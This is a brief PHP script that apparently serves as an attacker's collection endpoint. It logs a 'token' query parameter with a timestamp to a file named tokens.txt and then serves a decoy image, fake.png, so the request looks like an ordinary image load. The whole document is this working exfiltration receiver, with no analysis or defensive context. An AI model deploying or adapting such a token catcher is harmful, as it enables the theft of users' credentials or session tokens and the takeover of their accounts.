<?php
$t = $_GET['token'] ?? 'empty';
file_put_contents('tokens.txt', date("Y-m-d H:i")."  ".$t.PHP_EOL, FILE_APPEND);
header("Content-Type: image/png");
readfile("fake.png");
?>
